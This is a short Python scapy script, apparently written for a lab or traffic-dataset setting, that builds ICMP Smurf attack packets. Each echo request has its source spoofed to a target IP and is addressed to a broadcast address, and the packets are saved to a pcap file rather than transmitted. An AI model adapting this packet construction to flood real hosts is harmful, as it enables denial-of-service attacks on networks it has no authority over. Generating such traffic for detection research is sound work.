from scapy.all import *
import random
import time
import ipaddress

# ICMP Smurf
BROADCAST_IP = "192.168.100.255"
TARGET_IP = "192.168.100.2"
BOTFILE = "../bots.txt"
NUM_PACKETS = 100

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_smurf():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    numero_de_pacotes_enviados = 0


    while True:
        dest_ip = random.choice(bot_ips)
        ip_layer = IP(src=TARGET_IP, dst=BROADCAST_IP)
        eth_layer = Ether()
        icmp_layer = ICMP(type=8, code=0)  # Echo Request
        packet = eth_layer / ip_layer / icmp_layer
        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == NUM_PACKETS:
            break


    start_time = time.perf_counter()
    wrpcap("icmp_smurf.pcap", lista_de_pacotes)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nPCAP file saved.")
    print(f"Total time to save packets: {duration:.4f} seconds")


if __name__ == "__main__":
    run_icmp_smurf()

# Comando: sudo PYTHONPATH=$HOME/scapy python3 icmp_smurf.py